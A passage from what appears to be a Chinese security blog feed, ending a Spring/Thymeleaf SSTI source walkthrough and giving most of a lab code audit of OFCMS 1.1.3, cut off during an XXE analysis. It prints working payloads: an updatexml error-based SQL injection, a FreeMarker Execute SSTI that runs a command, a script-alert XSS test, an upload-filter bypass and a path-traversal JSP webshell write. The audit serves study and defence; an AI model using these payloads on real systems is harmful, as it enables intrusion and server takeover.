class="hljs-comment">//判断RequestHandled是否为True</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.isRequestNotModified(webRequest) || <span class="hljs-built_in">this</span>.getResponseStatus() != <span class="hljs-literal">null</span> || mavContainer.isRequestHandled()) &#123;<br>                <span class="hljs-built_in">this</span>.disableContentCachingIfNecessary(webRequest);<br>                <span class="hljs-comment">//设置RequestHandled属性</span><br>                mavContainer.setRequestHandled(<span class="hljs-literal">true</span>);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.hasText(<span class="hljs-built_in">this</span>.getResponseStatusReason())) &#123;<br>            mavContainer.setRequestHandled(<span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        mavContainer.setRequestHandled(<span class="hljs-literal">false</span>);<br>        Assert.state(<span class="hljs-built_in">this</span>.returnValueHandlers != <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;No return value handlers&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//通过handleReturnValue根据返回值的类型和返回值将不同的属性设置到ModelAndViewContainer中。</span><br>            <span class="hljs-built_in">this</span>.returnValueHandlers.handleReturnValue(returnValue, <span class="hljs-built_in">this</span>.getReturnValueType(returnValue), mavContainer, webRequest);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var6) &#123;<br>            <span class="hljs-keyword">if</span> (logger.isTraceEnabled()) &#123;<br>                logger.trace(<span class="hljs-built_in">this</span>.formatErrorForReturnValue(returnValue), var6);<br>            &#125;<br>            <span class="hljs-keyword">throw</span> var6;<br>       <br></code></pre></td></tr></table></figure><p>下面分析<code>handleReturnValue</code>方法。</p><ul><li><code>selectHandler</code>根据返回值和类型找到不同的<code>HandlerMethodReturnValueHandler</code>，这里得到了<code>ViewNameMethodReturnValueHandler</code>,具体怎么得到的就不分析了。</li><li>调用<code>handler.handleReturnValue</code>，这里得到不同的<code>HandlerMethodReturnValueHandler</code>处理的方式也不相同。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleReturnValue</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> Object returnValue, MethodParameter returnType, ModelAndViewContainer mavContainer, NativeWebRequest webRequest)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//获取handler</span><br>        <span class="hljs-type">HandlerMethodReturnValueHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.selectHandler(returnValue, returnType);<br>        <span class="hljs-keyword">if</span> (handler == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Unknown return value type: &quot;</span> + returnType.getParameterType().getName());<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//执行handleReturnValue操作</span><br>            handler.handleReturnValue(returnValue, returnType, mavContainer, webRequest);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>ViewNameMethodReturnValueHandler#handleReturnValue</p><ul><li>判断返回值类型是否为字符型，设置<code>mavContainer.viewName</code></li><li>判断返回值是否以<code>redirect:</code>开头，如果是的话则设置重定向的属性</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleReturnValue</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> Object returnValue, MethodParameter returnType, ModelAndViewContainer mavContainer, NativeWebRequest webRequest)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">if</span> (returnValue <span class="hljs-keyword">instanceof</span> CharSequence) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">viewName</span> <span class="hljs-operator">=</span> returnValue.toString();<br>            <span class="hljs-comment">//设置返回值为viewName</span><br>            mavContainer.setViewName(viewName);<br>            <span class="hljs-comment">//判断是否需要重定向</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.isRedirectViewName(viewName)) &#123;<br>                mavContainer.setRedirectModelScenario(<span class="hljs-literal">true</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (returnValue != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>(<span class="hljs-string">&quot;Unexpected return type: &quot;</span> + returnType.getParameterType().getName() + <span class="hljs-string">&quot; in method: &quot;</span> + returnType.getMethod());<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>通过上面的操作，将返回值设置为<code>mavContainer.viewName</code>,执行上述操作后返回到<code>RequestMappingHandlerAdapter#invokeHandlerMethod</code>中。通过<code>getModelAndView</code>获取<code>ModelAndView</code>对象。</p><p><code>getModelAndView</code>根据<code>viewName</code>和<code>model</code>创建<code>ModelAndView</code>对象并返回。</p><p><img src="/img/ssti(java)/ssti44.png"></p><h4 id="View-Resolver-与执行模板渲染"><a href="#View-Resolver-与执行模板渲染" class="headerlink" title="View Resolver 与执行模板渲染"></a>View Resolver 与执行模板渲染</h4><p>获取<code>ModelAndView</code>后，通过<code>DispatcherServlet#render</code>获取视图解析器并渲染。</p><p>看到712行引用自己的模板引擎渲染</p><p><img src="/img/ssti(java)/ssti45.png"></p><p>跳转到模板的render方法</p><p><img src="/img/ssti(java)/ssti46.png"></p><p>因为我们用的是 Thymeleaf 模版引擎，所以 view.render 找到对应的视图 <strong>ThymeleafView 的 render 方法</strong>进行渲染。</p><p>ThymeleafView 的 render 方法又调用 <strong>renderFragment</strong> 方法进行视图渲染，渲染完成之后，DispatcherServlet 就可以将结果返回给我们了。</p><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>动态调试一般适用于反复查看漏洞关键点不同的参数情况以及传参过程，代码执行情况调用的函数等一些比较大的方向看调用栈即可，一步步调试很容易乱</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li><p>三个模板漏洞都是在渲染代码中触发漏洞，走入对应的render渲染方法开始，最终走到Method类的invoke方法利用java反射调用runtime(或其他)方法执行exec命令后结束</p></li><li><p>将配置的拦截器加入到执行链中去，在<strong>getHandlerExecutionChain</strong> 方法</p></li><li><p>分析源码真的很需要耐心，得一步步慢慢调试才能进入关键函数</p></li></ol><p>参考：</p><ul><li><a href="https://www.cnblogs.com/LittleHann/p/17846825.html#_lab2_0_4">Java模版引擎注入（SSTI）漏洞研究 - 郑瀚 - 博客园 (cnblogs.com)</a></li><li><a href="https://drun1baby.top/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0">Java OWASP SSTI 学习 | Drunkbaby’s Blog (drun1baby.top)</a></li><li><a href="https://garck3h.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/#evaluate%E8%A7%A6%E5%8F%91">velocity的SSTI复现与分析 (garck3h.github.io)</a></li><li><a href="https://www.cnpanda.net/sec/1063.html">Thymeleaf SSTI 分析以及最新版修复的 Bypass - Panda | 热爱安全的理想少年 (cnpanda.net)</a></li><li><a href="https://xz.aliyun.com/news/9962">Thymeleaf SSTI漏洞分析-先知社区 (aliyun.com)</a></li><li><a href="https://segmentfault.com/a/1190000021848063#item-2-3">spring-mvc - 深入源码分析SpringMVC执行过程 - 后端技术社区 - SegmentFault 思否</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Java代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java代码审计</tag>
      
      <tag>漏洞学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OFCMS 1.1.3 代码审计(Java)</title>
    <link href="/2025/07/13/OFCMS%201.1.3%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(Java)/"/>
    <url>/2025/07/13/OFCMS%201.1.3%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(Java)/</url>
    
    <content type="html"><![CDATA[<h2 id="OFCMS-1-1-3-代码审计-Java"><a href="#OFCMS-1-1-3-代码审计-Java" class="headerlink" title="OFCMS 1.1.3 代码审计(Java)"></a>OFCMS 1.1.3 代码审计(Java)</h2><p>参考文章：</p><ul><li><a href="https://blog.csdn.net/YouthBelief/article/details/122978328">【Java代码审计】OFCMS 1.1.3 审计_ofcms-v1.1.3 idea-CSDN博客</a></li><li><a href="https://forum.butian.net/share/1229">奇安信攻防社区-记又一次Java代码审计 (butian.net)</a></li><li><a href="https://www.cnblogs.com/nice0e3/p/16217471.html#api">Java安全之freemarker 模板注入 - nice_0e3 - 博客园 (cnblogs.com)</a></li><li>[【Java代码审计】ofcms 1.1.3 | Fan的小酒馆 (fanygit.github.io)](<a href="https://fanygit.github.io/2022/10/09/[Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1]ofcms">https://fanygit.github.io/2022/10/09/[Java代码审计]ofcms</a> 1.1.3&#x2F;)</li></ul><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>项目地址：<a href="https://gitee.com/oufu/ofcms/tree/V1.1.3/">https://gitee.com/oufu/ofcms/tree/V1.1.3/</a></p><p>在IDEA中打开项目后，添加一个tomcat服务器</p><p><img src="/img/ofcms/ofcms01.png"></p><p>部署工件</p><p><img src="/img/ofcms/ofcms02.png"></p><p>等待maven配置后打开网站</p><p>自动安装报错</p><p><img src="/img/ofcms/ofcms03.png"></p><p>开始手动安装</p><p>首先在MySQL中创建空的ofcms数据库，然后将 <code>ofcms-V1.1.3/doc/sql/ofcms-v1.1.3.sql</code>文件导入到自己创建的数据库中(运行sql文件)</p><p>将数据库配置文件<code>ofcms-V1.1.3/ofcms-admin/src/main/resources/dev/conf/db-config.properties</code>文件名修改为<code>db.properties</code>，然后修改文件中的数据库配置信息</p><p><img src="/img/ofcms/ofcms04.png"></p><p>启动项目，访问程序后台地址：<br><code>http://localhost:8080/ofcms_admin_war/admin/index.html</code></p><p>默认账号和密码：admin&#x2F;123456</p><p>成功登录</p><h3 id="审计过程"><a href="#审计过程" class="headerlink" title="审计过程"></a>审计过程</h3><ul><li><p>先看pom.xml文件，关注引入的依赖</p><p>此cms引入了log4j的依赖，之后可以关注一下有无利用点</p></li><li><p>打开网站时在软件介绍处可以看到使用的是mybatis，freemarker模板，shiro安全框架，mysql数据库</p></li><li><p>翻看目录结构判断控制后台登录的核心代码大概都在ofcms-admin内</p></li><li><p>搜索关键字逐个排查漏洞(白盒)+在网页寻找功能点测试(黑盒)</p></li></ul><p>白盒审计时直接使用工具SAST(搜索关键字)，省去逐个搜索关键字的时间</p><p><img src="/img/ofcms/ofcms05.png"></p><p>逐个排查高危与中危漏洞，与网页功能点对应</p><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>工具审出的第一条sql注入漏洞回到源代码中找到对应点</p><p>ofcms-admin&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;ofsoft&#x2F;cms&#x2F;admin&#x2F;controller&#x2F;system&#x2F;SystemGenerateController.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">create</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> getPara(<span class="hljs-string">&quot;sql&quot;</span>);<br>Db.update(sql);<br>rendSuccessJson();<br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>e.printStackTrace();<br>rendFailedJson(ErrorCode.get(<span class="hljs-string">&quot;9999&quot;</span>), e.getMessage());<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到create()方法接收了用户输入的一条sql语句，并且无过滤</p><p>追踪getPara方法发现，此方法只是接收参数，无过滤</p><p>追踪Db.update方法，一直追踪到</p><p>jfinal&#x2F;jfinal&#x2F;3.2&#x2F;jfinal-3.2.jar!&#x2F;com&#x2F;jfinal&#x2F;plugin&#x2F;activerecord&#x2F;DbPro.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-title function_">update</span><span class="hljs-params">(Config config, Connection conn, String sql, Object... paras)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">pst</span> <span class="hljs-operator">=</span> conn.prepareStatement(sql);<br>        config.dialect.fillStatement(pst, paras);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> pst.executeUpdate();<br>        DbKit.close(pst);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br></code></pre></td></tr></table></figure><p>看到执行了传入的sql语句</p><p>虽然此方法创建预编译的 SQL 语句对象 <code>pst</code>，但是并未使用预编译写法(占位符，固定sql语句)，而是将传入的sql语句直接作为一个参数执行</p><p>判断此处存在sql注入</p><p>在网页寻找功能点：</p><p>由于此段代码在admin文件夹下，判断为后台功能点</p><p>在后台系统设置-&gt;代码生成-&gt;增加-&gt;输入sql</p><p>测试后发现能够报错，尝试报错注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs payload">update of_cms_link set link_name=updatexml(1,concat(0x7e,(user())),0) where link_id = 4<br></code></pre></td></tr></table></figure><p>成功注入</p><p><img src="/img/ofcms/ofcms06.png"></p><p>注：</p><p>刚刚可以看到使用了方法<mark>PreparedStatement.executeUpdate()</mark></p><p><code>executeUpdate()</code> 适用于执行：</p><ul><li><code>INSERT</code></li><li><code>UPDATE</code></li><li><code>DELETE</code></li><li><code>CREATE</code>, <code>DROP</code>, <code>ALTER</code> 等 DDL 语句</li></ul><p>payload构造应该使用这些语句</p><h4 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h4><p>在一开始查看软件说明时就可以了解到此源代码使用了freemarker模板引擎</p><p>在网页后台查看功能点时看到修改模板文件的功能</p><p><img src="/img/ofcms/ofcms07.png"></p><p>在源代码中定位控制代码</p><p>ofcms-admin&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;ofsoft&#x2F;cms&#x2F;admin&#x2F;controller&#x2F;cms&#x2F;TemplateController.java</p><p>save方法</p><p><img src="/img/ofcms/ofcms08.png"></p><p>可以看到对模板内容控制的代码只有框起来的两行，下面直接使用writeString方法写入并执行</p><p>追踪红框中调用的getRequest()与getParameter()方法，发现没有任何过滤</p><p>在网上查找freemarker模板ssti注入利用</p><p><a href="https://www.cnblogs.com/nice0e3/p/16217471.html#api">Java安全之freemarker 模板注入 - nice_0e3 - 博客园 (cnblogs.com)</a></p><p>payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; <br>  $&#123; ex(&quot;calc&quot;) &#125;<br></code></pre></td></tr></table></figure><p>不知道为什么，我的只有这个payload是可以弹出计算器的，可以尝试多种payload</p><p><img src="/img/ofcms/ofcms09.png"></p><h4 id="前台存储型xss"><a href="#前台存储型xss" class="headerlink" title="前台存储型xss"></a>前台存储型xss</h4><p>在网页寻找功能点时看到前台新闻页面有评论功能</p><p>发表评论通过开发者工具-&gt;网络功能，查看消息头，判断控制此功能的代码位置</p><p><img src="/img/ofcms/ofcms10.png"></p><p>在源码中查找</p><p>ofcms-api&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;ofsoft&#x2F;cms&#x2F; <mark>api&#x2F;v1&#x2F;CommentApi.java</mark></p><p>save方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// 获取请求参数</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">params</span> <span class="hljs-operator">=</span> getParamsMap();<br>        <span class="hljs-comment">// 获取用户真实 IP 地址，并添加到参数中</span><br>        params.put(<span class="hljs-string">&quot;comment_ip&quot;</span>, IpKit.getRealIp(getRequest()));<br>        <span class="hljs-comment">// 调用 SQL 模板 &quot;cms.comment.save&quot; 并执行更新操作（插入评论）</span><br>        Db.update(Db.getSqlPara(<span class="hljs-string">&quot;cms.comment.save&quot;</span>, params));<br>        <span class="hljs-comment">// 返回成功的 JSON 响应</span><br>        rendSuccessJson();<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        <span class="hljs-comment">// 如果出现异常，打印堆栈信息</span><br>        e.printStackTrace();<br>        <span class="hljs-comment">// 返回失败的 JSON 响应</span><br>        rendFailedJson();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>追踪getSqlPara函数并未发现过滤，此段代码只是直接获取评论内容随后在数据库中更新</p><p>使用xss payload：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>测试</p><p>看到其他师傅的测试是可以正常弹窗的，我的有404报错，不知道为什么</p><p><img src="/img/ofcms/ofcms11.png"></p><p>在后台直接编辑评论是可以正常弹窗的</p><h4 id="后台文件上传01"><a href="#后台文件上传01" class="headerlink" title="后台文件上传01"></a>后台文件上传01</h4><p>在网站寻找功能点找到文件上传</p><p>内容管理-&gt;栏目管理-&gt;关于我们-&gt;编辑-&gt;栏目图上传</p><p>抓取数据包</p><p><img src="/img/ofcms/ofcms12.png"></p><p>找到路由&#x2F;ofcms_admin_war&#x2F;admin&#x2F;comn&#x2F;service&#x2F;upload.js</p><p>全局搜索&#x2F;comn&#x2F;service&#x2F;</p><p>在源码中定位</p><p>ofcms-admin&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;ofsoft&#x2F;cms&#x2F;admin&#x2F;controller&#x2F;ComnController.java</p><p>upload方法</p><p><img src="/img/ofcms/ofcms13.png"></p><p>在此处下断点进行调试</p><p>getFile方法-&gt;getFiles方法-&gt;MultipartRequest类-&gt;wrapMultipartRequest方法-&gt;isSafeFile方法</p><p>getFiles方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> List&lt;UploadFile&gt; <span class="hljs-title function_">getFiles</span><span class="hljs-params">(String uploadPath)</span> &#123;<br>    <span class="hljs-comment">// 如果当前请求不是 MultipartRequest 类型（即非文件上传请求）</span><br>    <span class="hljs-keyword">if</span> (!(<span class="hljs-built_in">this</span>.request <span class="hljs-keyword">instanceof</span> MultipartRequest)) &#123;<br>        <span class="hljs-comment">// 将当前请求转换为 MultipartRequest，并指定文件上传的保存路径</span><br>        <span class="hljs-built_in">this</span>.request = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MultipartRequest</span>(<span class="hljs-built_in">this</span>.request, uploadPath);<br>    &#125;<br>    <span class="hljs-comment">// 将请求强制转换为 MultipartRequest，并获取上传的文件列表</span><br>    <span class="hljs-keyword">return</span> ((MultipartRequest)<span class="hljs-built_in">this</span>.request).getFiles();<br>&#125;<br></code></pre></td></tr></table></figure><p>该方法的作用是获取上传的文件列表，具体步骤如下：<br>  1.判断当前请求是否为文件上传类型（MultipartRequest）；<br>  2.如果不是，则将其包装成一个支持文件上传的请求对象，并指定上传路径；<br>  3.最后，从请求中获取并返回上传的文件列表（List<UploadFile>）。</p><p>wrapMultipartRequest方法中可以看到调用了isSafeFile方法</p><p><img src="/img/ofcms/ofcms15.png"></p><p>isSafeFile方法方法用于判断上传的文件类型是否是.jsp或.jspx文件</p><p>将文件后缀首尾去空及转换成小写</p><p><img src="/img/ofcms/ofcms14.png"></p><p>动态调试时也可以看到经过了复杂的判断，可以看到有Content-Type和后缀验证</p><p>此处是黑名单绕过</p><p><a href="https://blog.csdn.net/2301_81864699/article/details/143099369">文件上传绕过总结——详细保姆篇-CSDN博客</a></p><p>尝试截断%00，与后缀jspx绕过，能够成功上传，但是无法识别</p><p>尝试多种后是利用了1.jsp::$DATA(windows特性，上传至windows服务器后为1.jsp)成功上传</p><p><img src="/img/ofcms/ofcms16.png"></p><p>注：</p><p>动态调试后发现<mark>上传后的图片不在网站路径下</mark></p><p>在tomcat&#x2F;apache-tomcat-9.0.98&#x2F;webapps&#x2F;ofcms_admin_war&#x2F;upload&#x2F;image路径下</p><h4 id="后台文件上传02"><a href="#后台文件上传02" class="headerlink" title="后台文件上传02"></a>后台文件上传02</h4><p>感觉没想到文件上传漏洞会以这种形式呈现</p><p>如果不看文章自己肯定是想不到的</p><p>ofcms-admin&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;ofsoft&#x2F;cms&#x2F;admin&#x2F;controller&#x2F;cms&#x2F;TemplateController.java</p><p>save方法</p><p><img src="/img/ofcms/ofcms17.png"></p><p>可以看到这里对文件名及文件内容都没有限制，虽然此处控制的是网页模板修改功能，但是看代码是可以通过数据包上传文件的，是一个可利用的接口</p><p>抓取请求数据包往服务器写入webshell，在文件名中插入<code>../</code>路径跳转符，控制在static目录下写入恶意JSP文件</p><p>选择一个jsp恶意文件将内容url编码后写入数据包file_content中</p><p>file_name改为..&#x2F;..&#x2F;..&#x2F;static&#x2F;shell.jsp</p><p>(原index.html在&#x2F;tomcat&#x2F;apache-tomcat-9.0.98&#x2F;webapps&#x2F;ofcms_admin_war&#x2F;WEB-INF&#x2F;page&#x2F;default&#x2F;目录下，static与WEB-INF文件夹在同一级)</p><p><mark>不会上传到网站根目录下！！！</mark></p><p><img src="/img/ofcms/ofcms18.png"></p><p>可以看到顺利上传</p><p>D:&#x2F;tomcat&#x2F;apache-tomcat-9.0.98&#x2F;webapps&#x2F;ofcms_admin_war&#x2F;static</p><p><img src="/img/ofcms/ofcms19.png"></p><p>访问一下</p><p><img src="/img/ofcms/ofcms20.png"></p><p>可以看到是能够正常访问的，就是需要改一下编码</p><h4 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h4><p>在外部库中可以看到是有解析xml文档的相关资源包的</p><p><img src="/img/ofcms/ofcms21.png"></p><p>尝试搜索xml关键字</p><p>在com.ofsoft.cms.admin.controller.ReprotAction类的expReport方法中，接收用户输入的j参数后，拼接生成文件路径，这里没有进行过滤，可以穿越到其它目录，但是限制了文件后缀为jrxml，接下来会调用<code>JasperCompileManager.compileReport()</code>方法</p><p><code>.jrxml</code> 是JasperReports 报表模板源文件的文件扩展名，它是JasperReports 的 XML 格式报表模板</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">expReport</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> getResponse();<br>Map&lt;String, Object&gt; hm = getParamsMap();<br>    <br>    <span class="hljs-comment">//获取参数 j，即报表模板名（不含扩展名）；</span><br>        <span class="hljs-comment">//拼接模板的完整路径；</span><br>        <span class="hljs-comment">//用 PathKit.getWebRootPath() 获取 Web 根目录路径；</span><br>        <span class="hljs-comment">//创建一个 File 对象指向 .jrxml 模板文件。</span><br><span class="hljs-type">String</span> <span class="hljs-variable">jrxmlFileName</span> <span class="hljs-operator">=</span> (String) hm.get(<span class="hljs-string">&quot;j&quot;</span>);<br>jrxmlFileName = <span class="hljs-string">&quot;/WEB-INF/jrxml/&quot;</span> + jrxmlFileName + <span class="hljs-string">&quot;.jrxml&quot;</span>;<br><span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(PathKit.getWebRootPath() + jrxmlFileName);<br>    <br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> (String) hm.get(<span class="hljs-string">&quot;reportName&quot;</span>);<br>log.info(<span class="hljs-string">&quot;报表文件名[&#123;&#125;]&quot;</span>, file.getPath());<br> <span class="hljs-type">OutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-type">DataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> (DataSource) SysBeans<br>.getBean(<span class="hljs-string">&quot;dataSourceProxy&quot;</span>);<br><span class="hljs-type">JasperPrint</span> <span class="hljs-variable">jprint</span> <span class="hljs-operator">=</span> (JasperPrint) JasperFillManager.fillReport(<br>JasperCompileManager<br>.compileReport(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file)), hm,<br>dataSource.getConnection());<br><span class="hljs-type">JRXlsExporter</span> <span class="hljs-variable">exporter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JRXlsExporter</span>();<br>response.setHeader(<span class="hljs-string">&quot;Content-Disposition&quot;</span>, <span class="hljs-string">&quot;attachment;filename=&quot;</span><br>+ URLEncoder.encode(fileName, <span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">&quot;.xls&quot;</span>);<br>response.setContentType(<span class="hljs-string">&quot;application/xls&quot;</span>);<br>response.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>JasperReportsUtils.render(exporter, jprint,<br>response.getOutputStream());<br>response.setStatus(HttpServletResponse.SC_OK);<br> out=response.getOutputStream();<br> out.flush();<br>         out.close();<br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>e.printStackTrace();<br>&#125;<span class="hljs-keyword">finally</span>&#123;<br><span class="hljs-keyword">try</span> &#123;<br>out.close();<br>&#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>e.printStackTrace();<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析代码后找到了一段比较关键的代码</p><p>填充并生成报表</p><p>先使用 <code>JasperCompileManager</code> 编译 <code>.jrxml</code> 文件；</p><p>然后用参数 <code>hm</code> 和数据库连接填充报表内容，生成 <code>JasperPrint</code> 对象（代表报表数据结构）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">JasperPrint</span> <span class="hljs-variable">jprint</span> <span class="hljs-operator">=</span> (JasperPrint) JasperFillManager.fillReport(<br>    JasperCompileManager.compileReport(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file)),<br>    hm,<br>    